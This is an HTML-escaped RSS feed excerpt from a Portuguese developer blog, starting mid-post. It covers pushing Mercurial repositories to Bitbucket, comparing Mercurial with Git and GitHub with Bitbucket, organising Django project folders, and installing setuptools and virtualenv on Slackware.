    style=&quot;padding-bottom: 100%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAUCAYAAACNiR0NAAAACXBIWXMAAAsSAAALEgHS3X78AAADvklEQVQ4y41Ue0xXZRj+kHKtZn8009FGKxEvBVYKpevyhzHbvGYuHHIVrZ+ylIEyu+CSzaUzL1PQZm3eVhvegI2W1hQQm13hR2oCGlNRBoqZXILf5Zz36X3fcw5iWvNs775zvvN9z/e8z/t8ryGiHo4QgKBt28GwZQXl/X4ibNlBi/fIO2NI9BsXDDzCe0JhC02X2lFZ+xt2HKzB+j1HsW73ERTvr0JZVT3O/NGGvkBoYL23l0cyysyZoIttnbT801J6auYHFJnoo+Gv51Psm4UUl7yG4uevodi5hTQiaQUNSfDRyGkrKevj3dTQ3CqbybYVwzK2QxkXWq/R40n5ME/Mw5z87ei82Y3/erp7+5Gz/iuY6GQMSfShtv68g8b5G9FBPo79dI7MM5mImPQumBVWbTuML8pPoqKmAcd+bkTVL034+uRp7Kk8haLPKzEpbS0iE5fAjE7FzrJacqWyBxi2XL1Oj762HOaFxTATsmFiFsCMSYOJXwgz8R0nZH5sOsyoFJhns2D4cFl/YjBDqY58BEJhipnzEUxcFp/s09MfeJEZPL9YWZjRCxRQ5iI5JFXz3CIMe3UZrnTcVEDW0QF0q0RJOVtgxmXo4ogEPj0+G1wYp8KlVRg1+0M9MCLBp2HiFmLM3NXgTMmtsgPofedu3K9pKjNOZejkpWhovoLGi+348UwL2m90IWraygGmZlw6ZuWV6F5xym1Ay9bJnYdrYWLTGChHtZqRW4xbPX2OjlFvic7I33xA9X1oSo5KUbD1kO5llg6g+NBjeJyrKbo8+NJSFX3C/CIEQ2HMK/gMkzPXIRAMYzZbSg5TwPEZ6gQPUGR0NXSM3vFnFx55ZRmzTHVAObX3i8sUiK8kSg5Ua7U1XbaY6OlvaoVn7AGGboUU9kTdeUxMXcunZzr2iH5b2ailnkyGeTpFGYojDh2vUya2V9V7Af7e0ob6xsuo49j05XfILtoLqf7UJZuQvnoXPtn1Db5vuICzfJ9/PXcJg/dqyh5gOGzpZAk3ALGMpPrD6RZ0cGUDwZBq2flXD+qbLnOzOIKHX34PuRtLMXjvHYCWe7v9za1s5kWqo3hSNka9UaAxTNIW7eQGcVRU+x1At6p3AHo6dP/dr2YWDYdKYeR6yQESXBCvWOJTbihuyvcAlF7m/qDyaj9FT19FbB3iAhAz5Uh33sdn0GNT84j7pNe29LkL8N/NsrcvgKOnzmLDvm+xYstB5LGhpSAVNX7cuNXjrL27sylgv0vQEpIyKV1Dxv8LWeOt90aR8x/zr7dAhtYdeAAAAABJRU5ErkJggg==&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;img
        class=&quot;gatsby-resp-image-image&quot;
        alt=&quot;&amp;quot;Logotipo do BitBucket&amp;quot;&quot;
        title=&quot;Logotipo do BitBucket&quot;
        src=&quot;/static/ce36d314697154285d961d7076a96e53/e9ff0/bitbucket-logo.png&quot;
        srcset=&quot;/static/ce36d314697154285d961d7076a96e53/e9ff0/bitbucket-logo.png 180w&quot;
        sizes=&quot;(max-width: 180px) 100vw, 180px&quot;
        style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
        loading=&quot;lazy&quot;
      /&gt;
  &lt;/a&gt;
    &lt;/span&gt;
    &lt;figcaption class=&quot;gatsby-resp-image-figcaption&quot;&gt;Logotipo do BitBucket&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Se você ainda não tem uma conta no
&lt;a href=&quot;http://bitbucket.org/&quot; title=&quot;Bitbucket, compartilhe o seu código&quot;&gt;&lt;em&gt;Bitbucket&lt;/em&gt;&lt;/a&gt;, essa é uma grande oportunidade para fazer uma.&lt;/p&gt;
&lt;p&gt;Vamos criar um repositório para praticarmos o comando &lt;code class=&quot;language-text&quot;&gt;push&lt;/code&gt;. No
&lt;em&gt;Bitbucket&lt;/em&gt;:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Eu vou dar o nome de “post-django-com-hg” ao repositório, fique a
vontade para dar o nome que você desejar;&lt;/li&gt;
&lt;li&gt;Escolha o &lt;a href=&quot;/tag/python.html&quot; title=&quot;Leia mais sobre Python&quot;&gt;&lt;em&gt;Python&lt;/em&gt;&lt;/a&gt; como linguagem;&lt;/li&gt;
&lt;li&gt;Coloque uma pequena descrição;&lt;/li&gt;
&lt;li&gt;Eu vou marcar a opção &quot;Issue tracking&quot;, caso haja algum problema com
o código e vocês queiram sugerir melhorias.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;a href=&quot;https://bitbucket.org/kplaube/post-django-com-hg&quot; title=&quot;Confira o repositório criado no Bitbucket&quot;&gt;Confira o resultado&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;No repositório local vamos utilizar o comando &lt;code class=&quot;language-text&quot;&gt;push&lt;/code&gt; com o endereço do
repositório no &lt;em&gt;Bitbucket&lt;/em&gt;. Isso enviará todas as alterações que
persistidas em nosso repositório local para o repositório remoto,
mesclando-as com as contribuições de outros usuários envolvidos no
projeto:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;$ hg push https://bitbucket.org/kplaube/post-django-com-hg&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;strong&gt;Lembre-se&lt;/strong&gt; de mudar o endereço acima para o endereço do seu
repositório no &lt;em&gt;Bitbucket&lt;/em&gt;. Visite a página do seu repositório e veja o
que aconteceu… bacana, não?&lt;/p&gt;
&lt;p&gt;Mas dessa forma, teremos que sempre executar o comando &lt;code class=&quot;language-text&quot;&gt;pus&lt;/code&gt;h
informando o endereço do repositório. Vamos deixar esta tarefa mais
simples editando o arquivo &lt;code class=&quot;language-text&quot;&gt;hgrc&lt;/code&gt; dentro da pasta &lt;code class=&quot;language-text&quot;&gt;.hg&lt;/code&gt; do projeto:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;$ cd ~/Projetos/DjangoComHG/django-com-hg/
$ vim .hg/hgrc&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Coloque o seguinte:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;ini&quot;&gt;&lt;pre class=&quot;language-ini&quot;&gt;&lt;code class=&quot;language-ini&quot;&gt;&lt;span class=&quot;token selector&quot;&gt;[paths]&lt;/span&gt;
&lt;span class=&quot;token constant&quot;&gt;default&lt;/span&gt; &lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;=&lt;/span&gt; https://kplaube@bitbucket.org/kplaube/post-django-com-hg&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;strong&gt;Lembre-se&lt;/strong&gt; de mudar o endereço acima para o endereço do seu
repositório no &lt;em&gt;Bitbucket&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Pronto! Quando você for “pushear” não precisará mais informar o endereço
do repositório remoto.&lt;/p&gt;
&lt;p&gt;Altere alguns arquivos… &lt;code class=&quot;language-text&quot;&gt;commit&lt;/code&gt;. Adicione alguns arquivos…
&lt;code class=&quot;language-text&quot;&gt;commit&lt;/code&gt;. Ao final do dia, dê um &lt;code class=&quot;language-text&quot;&gt;push&lt;/code&gt; e deixe o resto da equipe
saber o que você fez ;)&lt;/p&gt;
&lt;h2&gt;Referências&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;http://mercurial.selenic.com/&quot; title=&quot;Mercurial, work easier, work faster&quot;&gt;Site oficial do projeto &lt;em&gt;Mercurial&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://en.wikipedia.org/wiki/Mercurial&quot; title=&quot;Leia mais sobre Mercurial na Wikipedia&quot;&gt;Artigo na &lt;em&gt;Wikipedia&lt;/em&gt; sobre &lt;em&gt;Mercurial&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://en.wikipedia.org/wiki/Mercury_(element)&quot; title=&quot;Leia mais sobre Mercúrio no Wikipedia&quot;&gt;Artigo na &lt;em&gt;Wikipedia&lt;/em&gt; sobre Mercúrio (o elemento químico)&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://tocadoelfo.blogspot.com/2011/03/mercurial-hg-controlando-as-versoes-do.html&quot; title=&quot;Excelente post sobre Mercurial, TI e gerência de projetos&quot;&gt;&lt;em&gt;Mercurial Hg&lt;/em&gt; – Controlando as Versões do seu &lt;em&gt;Software&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://hgbook.red-bean.com/read/&quot; title=&quot;Excelente e-book de Bryan O&amp;#x27;Sullivan sobre Mercurial&quot;&gt;&lt;em&gt;Mercurial&lt;/em&gt;: &lt;em&gt;The Definitive Guide&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;No próximo &lt;em&gt;post&lt;/em&gt;, vamos concluir a trilogia mostrando uma forma bacana
de utilizar o &lt;em&gt;Mercurial&lt;/em&gt; para versionar seus projetos &lt;em&gt;Django&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Até a próxima…&lt;/p&gt;</content:encoded></item><item><title><![CDATA[Como versionar projetos Django com o Mercurial - Parte 1]]></title><description><![CDATA[Se você está começando em Django, e nunca utilizou uma ferramenta
de controle de versão (as vezes por trauma do SVN ou por simples
desinteresse) esta será uma grande oportunidade para você conhecer o
Mercurial, e saber a forma que venho utilizando para versionar
meus projetos Django. Peraí! Por que…]]></description><link>https://klauslaube.com.br/2011/05/10/como-versionar-projetos-django-mercurial-parte.html</link><guid isPermaLink="false">https://klauslaube.com.br/2011/05/10/como-versionar-projetos-django-mercurial-parte.html</guid><dc:creator><![CDATA[Klaus Peter Laube]]></dc:creator><pubDate>Tue, 10 May 2011 21:34:00 GMT</pubDate><content:encoded>&lt;p&gt;Se você está começando em &lt;a href=&quot;/tag/django.html&quot; title=&quot;Leia mais sobre Django&quot;&gt;&lt;em&gt;Django&lt;/em&gt;&lt;/a&gt;, e nunca utilizou uma ferramenta
de controle de versão (as vezes por trauma do &lt;a href=&quot;http://akitaonrails.com/2007/09/22/jogar-pedra-em-gato-morto-por-que-subversion-no-presta&quot; title=&quot;Jogar Pedra em Gato Morto: por que Subversion não presta&quot;&gt;&lt;em&gt;SVN&lt;/em&gt;&lt;/a&gt; ou por &lt;a href=&quot;http://pt.wikipedia.org/wiki/Sistema_de_controle_de_vers%C3%A3o&quot; title=&quot;Wikipedia, Sistema de Controle de Versão&quot;&gt;simples
desinteresse&lt;/a&gt;) esta será uma grande oportunidade para você conhecer o
&lt;a href=&quot;http://www.profissionaisti.com.br/2009/06/bitbucket-hospede-e-versione-softwares-com-mercurial/&quot; title=&quot;Bitbucket: Hospede e versione softwares com Mercurial&quot;&gt;&lt;em&gt;Mercurial&lt;/em&gt;&lt;/a&gt;, e saber a forma que venho utilizando para versionar
meus projetos Django.&lt;/p&gt;
&lt;h2&gt;Peraí! Por que não Git?&lt;/h2&gt;
&lt;p&gt;Sem dúvida o &lt;a href=&quot;http://git-scm.com/&quot; title=&quot;Git é a estrela do momento tratando-se de DVCS&quot;&gt;&lt;em&gt;Git&lt;/em&gt;&lt;/a&gt; é a ferramenta do momento em
se tratando de controle de versões, e vem sendo muito utilizada por
rubistas e pythonistas (eu incluso nessa última galera).&lt;/p&gt;
&lt;p&gt;Por que não falar de &lt;em&gt;Git&lt;/em&gt; aqui? Simples! &lt;strong&gt;Você vai ouvir falar sobre
&lt;em&gt;Git&lt;/em&gt; em todo o lugar&lt;/strong&gt;. O &lt;em&gt;Google&lt;/em&gt; vai te trazer toneladas de
informações sobre &lt;em&gt;Git&lt;/em&gt;. Você vai “ouvir” o pessoal falando que &lt;a href=&quot;http://pt.whygitisbetterthanx.com/&quot; title=&quot;Por que Git é Melhor que X&quot;&gt;&lt;em&gt;Git&lt;/em&gt; é melhor do que qualquer outra ferramenta&lt;/a&gt;.
Você vai até enjoar de tanto ouvir falar sobre &lt;em&gt;Git&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;O &lt;em&gt;Mercurial&lt;/em&gt; foi o primeiro &lt;a href=&quot;http://en.wikipedia.org/wiki/Distributed_revision_control&quot; title=&quot;DVCS - Distributed Version Control System&quot;&gt;&lt;em&gt;DVCS&lt;/em&gt;&lt;/a&gt; que utilizei (de verdade). &lt;strong&gt;Na
minha opinião&lt;/strong&gt;, ele é mais simples que o &lt;em&gt;Git&lt;/em&gt;, é feito em
&lt;a href=&quot;/tag/python.html&quot; title=&quot;Leia mais sobre Python&quot;&gt;&lt;em&gt;Python&lt;/em&gt;&lt;/a&gt;, e me atende no desenvolvimento dos meus projetos pessoais.&lt;/p&gt;
&lt;p&gt;Concordo com o pessoal que diz que o &lt;em&gt;Git&lt;/em&gt; é bom, e concordo com o
pessoal que fala que o &lt;em&gt;Mercurial&lt;/em&gt; é bom. É perfeitamente possível
utilizar estas duas ferramentas, não precisamos ser radicais e iniciar
um &lt;em&gt;flame&lt;/em&gt; em cima deste assunto. A opção é melhor que não ter opção…&lt;/p&gt;
&lt;h2&gt;GitHub x Bitbucket&lt;/h2&gt;
&lt;p&gt;Agora uma coisa eu não posso deixar de concordar: O &lt;a href=&quot;https://github.com/&quot; title=&quot;GitHub, Social coding&quot;&gt;&lt;em&gt;GitHub&lt;/em&gt;&lt;/a&gt; é (na minha opinião) melhor que o
&lt;a href=&quot;https://bitbucket.org/&quot; title=&quot;Alternativa com Mercurial ao GitHub&quot;&gt;&lt;em&gt;Bitbucket&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Ambos são repositórios de código na nuvem, o primeiro usando &lt;em&gt;Git&lt;/em&gt; e o
segundo usando &lt;em&gt;Mercurial&lt;/em&gt;. O detalhe é que o &lt;em&gt;GitHub&lt;/em&gt; tem algumas
funções mais apuradas que o &lt;em&gt;Bitbucket&lt;/em&gt;, principalmente as
funcionalidades que tornam a ferramenta muito mais “social”.&lt;/p&gt;
&lt;p&gt;Embora o &lt;em&gt;Bitbucket&lt;/em&gt; recentemente tenha sido adquirido pela
&lt;strong&gt;&lt;em&gt;Atlassian&lt;/em&gt;&lt;/strong&gt; e tenha recebido uma forte injencão de melhorias… o
&lt;em&gt;GitHub&lt;/em&gt; ainda é, para mim, a melhor forma de compartilhar código que
existe no momento.&lt;/p&gt;
&lt;p&gt;Venho utilizando o &lt;em&gt;Bitbucket&lt;/em&gt; pela opção de poder manter &lt;strong&gt;repositórios
de código “fechados”&lt;/strong&gt;. Coisa que com o “rival” só é possível através de
uma conta paga.&lt;/p&gt;
&lt;p&gt;Mais uma vez… é perfeitamente possível viver utilizando as duas
ferramentas.&lt;/p&gt;
&lt;p&gt;Na próxima parte deste &lt;em&gt;post&lt;/em&gt; vamos abordar o básico do &lt;em&gt;Mercurial&lt;/em&gt;, e
também pretendo mostrar como organizo os meus projetos &lt;em&gt;Django&lt;/em&gt;
“versionando-os” com o &lt;em&gt;Mercurial&lt;/em&gt; e &lt;em&gt;Bitbucket&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Até a próxima…&lt;/p&gt;</content:encoded></item><item><title><![CDATA[Como organizar seus projetos Django]]></title><description><![CDATA[Pretendo compartilhar com vocês a forma que venho utilizando para
organizar meus projetos Django com o uso do virtualenv.
Não entrarei em muitos detalhes, até porque você verá que é um
procedimento muito simples, mas que poderá garantir melhor organização
dos seus projetos e dos seus ambientes de…]]></description><link>https://klauslaube.com.br/2011/04/11/como-organizar-seus-projetos-django.html</link><guid isPermaLink="false">https://klauslaube.com.br/2011/04/11/como-organizar-seus-projetos-django.html</guid><dc:creator><![CDATA[Klaus Peter Laube]]></dc:creator><pubDate>Mon, 11 Apr 2011 18:11:00 GMT</pubDate><content:encoded>&lt;p&gt;Pretendo compartilhar com vocês a forma que venho utilizando para
organizar meus projetos &lt;a href=&quot;/tag/django.html&quot; title=&quot;Leia mais sobre Django&quot;&gt;&lt;em&gt;Django&lt;/em&gt;&lt;/a&gt; com o uso do &lt;a href=&quot;/tag/virtualenv.html&quot; title=&quot;Leia mais sobre virtualenv&quot;&gt;&lt;em&gt;virtualenv&lt;/em&gt;&lt;/a&gt;.
Não entrarei em muitos detalhes, até porque você verá que é um
procedimento muito simples, mas que poderá garantir melhor organização
dos seus projetos e dos seus ambientes de desenvolvimento.&lt;/p&gt;
&lt;p&gt;É interessante que você leia o post &lt;a href=&quot;/2011/03/18/python-django-virtualenv.html&quot; title=&quot;Leia mais sobre a tríade Python, Django e virtualenv&quot;&gt;&lt;em&gt;Python&lt;/em&gt;, &lt;em&gt;Django&lt;/em&gt; e
&lt;em&gt;virtualenv&lt;/em&gt;&lt;/a&gt; antes de continuar.&lt;/p&gt;
&lt;h2&gt;Simplesmente um projeto Django&lt;/h2&gt;
&lt;p&gt;Antes de conhecer (e utilizar) o &lt;em&gt;virtualenv&lt;/em&gt;, utilizei algo parecido
com o modelo “tradicional” de organização de pastas e códigos em um
projeto &lt;em&gt;Django&lt;/em&gt;. Ou seja, parecido com aquela estrutura padrão
gerada pelo comando &lt;code class=&quot;language-text&quot;&gt;django-admin.py startproject&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;O modelo é bom, e funcionou para mim durante muito tempo. Mas de uns
tempos para cá venho utilizando o esquema abaixo (confira um exemplo
real):&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;mysite/
    apps/
        __init__.py
        eggs/
            fixtures/
                eggs_testdata.json
            tests/
                __init__.py
                models.py
                views.py
            __init__.py
            models.py
            urls.py
            views.py
        core/
            __init__.py
            extras.py
    __init__.py
    manage.py
    settings.py
    urls.py&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;A diferença principal está na utilização da pasta &lt;code class=&quot;language-text&quot;&gt;apps&lt;/code&gt; para
encapsular as aplicações do projeto, e a criação de uma pasta (ou
pacote, como preferir) &lt;code class=&quot;language-text&quot;&gt;core&lt;/code&gt;. Nesta última, gosto de armazenar
&lt;em&gt;snippets&lt;/em&gt; de código que serão aproveitados pelo projeto inteiro.&lt;/p&gt;
&lt;p&gt;Outro ponto que vale ser notado é a criação de uma pasta chamada
&lt;code class=&quot;language-text&quot;&gt;tests&lt;/code&gt; para cada &lt;em&gt;app&lt;/em&gt;. Embora haja casos em que um arquivo
&lt;code class=&quot;language-text&quot;&gt;tests.py&lt;/code&gt; seja o suficiente, podemos nos deparar com um arquivo
gigantesco testando vários aspectos de uma &lt;em&gt;app&lt;/em&gt; (o que pode dificultar
a legibilidade de código). Categorizar os testes por tipo, e em arquivos
separados, irá facilitar a adição de novos testes e funcionalidades.&lt;/p&gt;
&lt;p&gt;A abordagem dos testes também pode ser utilizada para o &lt;code class=&quot;language-text&quot;&gt;urls.py&lt;/code&gt;.
Quando o seu arquivo de roteamento ficar muito grande, crie uma pasta
&lt;code class=&quot;language-text&quot;&gt;urls&lt;/code&gt; e “quebre” suas rotas em arquivos diferentes. Categorize-os,
sinta-se “zen” e nunca mais tenha medo de criar &lt;em&gt;URLs&lt;/em&gt; novamente&lt;/p&gt;
&lt;p&gt;Comecei a utilizar esta estrutura após “xeretar” alguns projetos
&lt;em&gt;Django&lt;/em&gt; &lt;em&gt;open source&lt;/em&gt;. Posso dizer por experiência própria que é uma
prática interessante, e que tem me ajudado muito na organização de
código.&lt;/p&gt;
&lt;h2&gt;O projeto Django com o virtualenv&lt;/h2&gt;
&lt;p&gt;Tratando-se do ambiente de desenvolvimento (construído pelo
&lt;em&gt;virtualenv&lt;/em&gt;), já utilizei-o de duas formas:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;O &lt;em&gt;environment&lt;/em&gt; em uma pasta separada do projeto:&lt;/strong&gt; Você pode
possuir uma pasta “environments” e lá ter diferentes ambientes para
diferentes projetos.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;O projeto &lt;em&gt;Django&lt;/em&gt; ficar dentro da pasta de &lt;em&gt;environment&lt;/em&gt;:&lt;/strong&gt; Você
primeiramente constrói um ambiente com o &lt;em&gt;virtualenv&lt;/em&gt;, e depois cria
um projeto dentro dessa mesma pasta (como demonstrado &lt;a href=&quot;http://blog.triveos.com.br/2010/04/25/trabalhando-com-python-e-django/&quot; title=&quot;Trabalhando com Python e Django à moda Osvaldo&quot;&gt;neste &lt;em&gt;post&lt;/em&gt; do &lt;em&gt;Osvaldo Santana&lt;/em&gt;&lt;/a&gt;).&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Particularmente eu prefiro a segunda opção (nunca precisei de 2
&lt;em&gt;environments&lt;/em&gt; idênticos). Além de manter todo o seu projeto agrupado,
fica mais fácil para criação de &lt;em&gt;scripts&lt;/em&gt; de automatização de &lt;em&gt;deploy&lt;/em&gt;,
por exemplo.&lt;/p&gt;
&lt;p&gt;No fim das contas, geralmente a estrutura de pastas dos projetos
&lt;em&gt;Django&lt;/em&gt; fica assim:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;MySiteProject/
    bin/
    include/
    lib/
    mysite/
        apps/
            __init__.py
            eggs/
                fixtures/
                    eggs_testdata.json
                tests/
                    __init__.py
                    models.py
                    views.py
                __init__.py
                models.py
                urls.py
                views.py
            core/
                __init__.py
                extras.py
        __init__.py
        manage.py
        settings.py
        urls.py&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;E você? De que forma organiza os seus projetos em &lt;em&gt;Django&lt;/em&gt;? Conte-nos
através dos comentários abaixo!&lt;/p&gt;
&lt;p&gt;Até a próxima…&lt;/p&gt;</content:encoded></item><item><title><![CDATA[Python, Django e virtualenv]]></title><description><![CDATA[Dando continuidade a série “Montando seu ambiente de desenvolvimento
Django em Linux”, vamos dar uma pincelada na tríade Python,
Django e virtualenv. Python Conheça alguns motivos que lhe convencerão a usar Python. O Python já vem instalado na maioria das distribuições Linux. Na
verdade, até hoje…]]></description><link>https://klauslaube.com.br/2011/03/18/python-django-virtualenv.html</link><guid isPermaLink="false">https://klauslaube.com.br/2011/03/18/python-django-virtualenv.html</guid><dc:creator><![CDATA[Klaus Peter Laube]]></dc:creator><pubDate>Fri, 18 Mar 2011 19:24:00 GMT</pubDate><content:encoded>&lt;p&gt;Dando continuidade a série “&lt;a href=&quot;/2011/03/03/montando-seu-ambiente-de-desenvolvimento-django.html&quot; title=&quot;Montando seu ambiente de desenvolvimento Django em Linux&quot;&gt;Montando seu ambiente de desenvolvimento
&lt;em&gt;Django&lt;/em&gt; em &lt;em&gt;Linux&lt;/em&gt;&lt;/a&gt;”, vamos dar uma pincelada na tríade &lt;a href=&quot;/tag/python.html&quot; title=&quot;Leia mais sobre Python&quot;&gt;&lt;em&gt;Python&lt;/em&gt;&lt;/a&gt;,
&lt;a href=&quot;/tag/django.html&quot; title=&quot;Leia mais sobre Django&quot;&gt;&lt;em&gt;Django&lt;/em&gt;&lt;/a&gt; e &lt;a href=&quot;/tag/virtualenv.html&quot; title=&quot;Leia mais sobre Virtualenv&quot;&gt;&lt;em&gt;virtualenv&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;h2&gt;Python&lt;/h2&gt;
&lt;p&gt;&lt;a href=&quot;http://www.profissionaisti.com.br/2009/01/10-motivos-para-voce-aprender-a-programar-em-python/&quot; title=&quot;10 motivos para se usar Python&quot;&gt;Conheça alguns motivos que lhe convencerão a usar &lt;em&gt;Python&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;O &lt;em&gt;Python&lt;/em&gt; já vem instalado na maioria das distribuições &lt;a href=&quot;/tag/linux.html&quot; title=&quot;Leia mais sobre Linux&quot;&gt;&lt;em&gt;Linux&lt;/em&gt;&lt;/a&gt;. Na
verdade, até hoje nunca usei uma distro &lt;em&gt;Linux&lt;/em&gt; que não tivesse o
&lt;em&gt;Python&lt;/em&gt; previamente instalado. No &lt;em&gt;Slackware 13.1&lt;/em&gt;, o &lt;em&gt;Python&lt;/em&gt; está na
versão 2.6.4. No &lt;em&gt;Debian 6&lt;/em&gt;, o &lt;em&gt;Python&lt;/em&gt; está na versão 2.6.6.&lt;/p&gt;
&lt;p&gt;O portal &lt;em&gt;Python Brasil&lt;/em&gt; possui um excelente material para você
&lt;a href=&quot;http://www.python.org.br/wiki/InicieSe&quot; title=&quot;Inicie-se no Python&quot;&gt;instalar&lt;/a&gt; e dar os &lt;a href=&quot;http://www.python.org.br/wiki/AprendaMais&quot; title=&quot;Aprenda mais sobre Python&quot;&gt;primeiros passos&lt;/a&gt; com &lt;em&gt;Python&lt;/em&gt;.&lt;/p&gt;
&lt;h2&gt;virtualenv&lt;/h2&gt;
&lt;p&gt;A linguagem &lt;em&gt;Python&lt;/em&gt; não vem “de bobeira” nas distribuições &lt;em&gt;Linux&lt;/em&gt;, ela
faz parte delas, sendo utilizada para criação de uma série de &lt;em&gt;scripts&lt;/em&gt;
fundamentais. Passei por uma situação peculiar com o &lt;em&gt;Python&lt;/em&gt;: estava
usando o &lt;em&gt;OpenSuse&lt;/em&gt; (não recordo a versão) e decidi atualizar a versão
do &lt;em&gt;Python&lt;/em&gt; utilizando o sistema de pacotes da distro… confirmei algumas
operações de remoção (que não deveria ter autorizado) e acabei
danificando minha instalação do &lt;a href=&quot;/tag/sistemas-operacionais.html&quot; title=&quot;Leia mais sobre Sistemas Operacionais&quot;&gt;&lt;em&gt;SO&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Então, para aqueles que programam em computadores pessoais, e não querem
comprometer tanto o &lt;em&gt;SO&lt;/em&gt; quanto o &lt;em&gt;workspace&lt;/em&gt;, podem criar &lt;em&gt;ambientes
isolados&lt;/em&gt; para os projetos utilizando o &lt;a href=&quot;http://pypi.python.org/pypi/virtualenv&quot; title=&quot;Virtual Python Environment Builder&quot;&gt;&lt;em&gt;virtualenv&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;No &lt;em&gt;Slackware&lt;/em&gt; vamos instalar o &lt;a href=&quot;http://pypi.python.org/pypi/setuptools&quot; title=&quot;Download, build, install, upgrade, and uninstall Python packages&quot;&gt;&lt;em&gt;setuptools&lt;/em&gt;&lt;/a&gt;, que é um &lt;em&gt;framework&lt;/em&gt;
que facilita a instalação e criação de pacotes &lt;em&gt;Python&lt;/em&gt;:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;$ wget http://peak.telecommunity.com/dist/ez_setup.py&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Para instalá-lo é necessário ser &lt;em&gt;&lt;em&gt;root&lt;/em&gt;&lt;/em&gt;:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;$ python ez_setup.py&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Em seguida, vamos instalar o &lt;em&gt;virtualenv&lt;/em&gt; com a ajuda do
&lt;code class=&quot;language-text&quot;&gt;_easy_install_&lt;/code&gt; (que faz parte do pacote &lt;em&gt;setuptools&lt;/em&gt;):&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;$ easy_install virtualenv&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Esta é uma forma interessante para você instalar módulos &lt;em&gt;Python&lt;/em&gt; em seu
sistema sem recorrer ao sistema de pacotes do &lt;em&gt;SO&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Agora, como um usuário comum, vamos criar um ambiente em nosso
&lt;code class=&quot;language-text&quot;&gt;home&lt;/code&gt; para testarmos o &lt;em&gt;virtualenv&lt;/em&gt;:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;$ virtualenv ~/projeto_django&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Entrando nesta pasta, você irá se deparar com três diretórios:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code class=&quot;language-text&quot;&gt;bin&lt;/code&gt;: Os executáveis do seu ambiente isolado estarão aí. Você
poderá notar o executável &lt;code class=&quot;language-text&quot;&gt;python&lt;/code&gt;, o &lt;code class=&quot;language-text&quot;&gt;easy_install&lt;/code&gt;, o &lt;code class=&quot;language-text&quot;&gt;pip&lt;/code&gt; e um carinha chamado &lt;code class=&quot;language-text&quot;&gt;activate&lt;/code&gt; (falaremos deste mais tarde).&lt;/li&gt;
